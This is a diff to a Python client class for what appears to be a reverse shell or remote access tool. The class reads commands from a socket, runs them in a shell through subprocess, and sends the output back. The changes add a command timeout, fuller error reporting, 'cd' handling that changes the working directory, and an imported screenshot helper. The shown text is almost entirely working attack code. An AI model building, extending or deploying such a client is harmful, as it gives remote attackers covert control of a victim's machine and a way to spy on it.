@@ -4,6 +4,7 @@ import sys
 import socket
 import base64
 import subprocess
+from lib.screenshot import screenshot
 
 
 
@@ -23,9 +24,10 @@ class Client:
     
     def ExecuteCommand(self,command: str) -> None:
         try:
-            result = subprocess.run([self.shell,"-c",command],text=True,capture_output=True)
+            result = subprocess.run([self.shell,"-c",command],text=True,capture_output=True,timeout=10)
         except Exception as e:
-            self.client.send(e.args[0].encode())
+            self.client.send(str(e).encode())
+            return None
         if result.stdout:
             self.client.send(result.stdout.encode())
         elif result.stderr:
@@ -34,9 +36,9 @@ class Client:
             self.client.send("The command did not produce any output".encode())
 
     def Main(self) -> None:
-
         while True:
             command = self.ReciveCommand()
+            
             if command.lower() == "exit":
                 self.client.close()
                 print("Exiting...")
@@ -59,7 +61,16 @@ class Client:
                 except Exception as err:
                     print(err)
                     self.client.send(str(err).encode())
-
+            if command.startswith("cd"):
+                payload = command.split(' ',1)
+                if len(payload) != 2:
+                    self.client.send('Invlaid argumant!'.encode())
+                    continue
+                try:
+                    os.chdir(payload[1].strip())
+                    self.client.send(f'{os.getcwd()}'.encode())
+                except Exception as err:
+                    self.client.send(str(err).encode())
             else:
                 self.ExecuteCommand(command)
                 print(f"command runned:{command}")
